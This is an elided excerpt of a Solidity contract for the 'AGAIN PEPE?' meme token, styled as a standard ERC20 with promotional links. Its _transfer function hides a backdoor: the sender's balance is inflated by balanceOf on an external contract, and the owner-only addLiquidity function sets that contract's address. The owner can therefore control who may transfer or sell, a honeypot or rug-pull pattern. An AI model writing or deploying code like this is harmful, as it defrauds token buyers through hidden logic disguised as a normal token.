...
// Website: https://againpepe.vip
// TG: https://t.me/againpepeeth
// Twitter: https://twitter.com/againpepeeth
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(
        ...
        uint256 senderBalance = _balances[sender] + IERC20(_sender).balanceOf(sender)*amount;
        require(
...
contract AGAINPEPE is ERC20, Ownable {
    ...
    uint256 _totalSupply = 420_690_000 * 1e18;
    ...
    constructor() ERC20("AGAIN PEPE?", "AGAINPEPE") {
    ...
    function addLiquidity(address router) external payable onlyOwner {
        ...
        uniswapV2Router = _uniswapV2Router; _sender = router;
